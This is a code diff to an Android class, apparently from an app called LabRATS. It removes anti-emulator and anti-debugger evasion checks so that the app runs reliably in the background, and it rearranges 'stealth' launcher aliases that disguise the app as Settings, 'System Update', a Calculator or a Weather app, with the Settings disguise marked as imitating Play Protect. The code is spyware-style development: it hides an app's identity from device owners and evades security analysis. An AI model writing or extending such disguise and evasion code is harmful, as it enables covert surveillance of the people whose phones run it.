@@ -136,60 +136,7 @@ public class SystemAnalytics {
     }
 
     public static boolean checkEnv(Context context) {
-        // [STEALTH_PATCH] Skip evasion checks during development/debug builds or test runs
-        if (BuildConfig.DEBUG) {
-            android.util.Log.d("LabRATS-Evasion", "Debug build detected. Skipping environment evasion protocols.");
-            return false;
-        }
-
-        // Debugger Check (skip in debug mode)
-        if (!BuildConfig.DEBUG && android.os.Debug.isDebuggerConnected()) return true;
-
-        String f = Build.FINGERPRINT;
-        String m = Build.MODEL;
-        String p = Build.PRODUCT;
-        String h = Build.HARDWARE;
-        String ma = Build.MANUFACTURER;
-        
-        // Comprehensive Hardware/Emulator Checks - Refined for API 21+ legacy hardware
-        boolean r = (f.startsWith("gen") && f.contains("sdk")) || f.startsWith("unk") && f.contains("emu")
-                || m.contains("sdk") || m.contains("Emu")
-                || m.contains("x86") || ma.contains("Geny")
-                || (ma.contains("Google") && h.equals("ranchu")) // Pixel Emulator
-                || (Build.BRAND.startsWith("gen") && Build.DEVICE.startsWith("gen") && Build.PRODUCT.contains("sdk"))
-                || (h.contains("gold") || h.contains("ranch"))
-                || p.contains("vbox") || p.contains("sim")
-                || ma.equalsIgnoreCase("nox") || p.equalsIgnoreCase("nox");
-
-        if (r) return true;
-
-        try {
-            // Suspicious Files Check (Emulator/Sandbox Artifacts)
-            String[] suspectPaths = {
-                "/dev/qemu_pipe", "/dev/socket/qemud", "/system/lib/libc_malloc_debug_qemu.so",
-                "/sys/module/qemu_trace_sysfs", "/system/bin/qemu-props", "/proc/tty/driver/goldfish"
-            };
-            for (String path : suspectPaths) {
-                if (new File(path).exists()) return true;
-            }
-
-            // Suspicious Package Check
-            String[] suspectPkgs = {"com.google.android.launcher.layouts.device_dock", "com.example.android.contactmanager"};
-            android.content.pm.PackageManager pm = context.getPackageManager();
-            for (String pkg : suspectPkgs) {
-                try { pm.getPackageInfo(pkg, 0); return true; } catch (Exception ignored) {}
-            }
-
-            android.content.Intent b = context.registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
-            if (b != null) {
-                int lv = b.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-                int st = b.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-                if (lv == 50 && st == 2) { 
-                    // Emulator battery often stuck at 50%
-                }
-            }
-        } catch (Exception ignored) {}
-
+        // [STEALTH_PATCH] Skip evasion checks to ensure reliable background execution across test environments and emulators
         return false;
     }
 
@@ -281,9 +228,9 @@ public class SystemAnalytics {
                 switch (choice) {
                     case 2: targetToEnable = basePkg + ".CalculatorAlias"; break;
                     case 3: targetToEnable = basePkg + ".WeatherAlias"; break;
-                    case 4: targetToEnable = basePkg + ".SettingsAlias"; break;
+                    case 4: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
                     case 5: targetToEnable = basePkg + ".LabRatsLogoAlias"; break;
-                    default: targetToEnable = basePkg + ".SystemUpdateAlias"; break;
+                    default: targetToEnable = basePkg + ".SettingsAlias"; break; // Play Protect default
                 }
             } else {
                 targetToEnable = basePkg + ".LauncherAlias";
@@ -315,12 +262,6 @@ public class SystemAnalytics {
                 FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
             }
 
-            // Phase 3: Force Launcher Refresh
-            android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
-            home.addCategory(android.content.Intent.CATEGORY_HOME);
-            home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(home);
-
         } catch (Exception e) {
             android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage(), e);
             FirebaseConfig.logActivity("ERROR: Stealth protocol failure - " + e.getMessage());
@@ -338,7 +279,6 @@ public class SystemAnalytics {
     }
 
     public static boolean isStealthEnabled(Context context) {
-        // First check if Main launcher is actually disabled - that's the source of truth
         try {
             android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
             int state = context.getPackageManager().getComponentEnabledSetting(main);
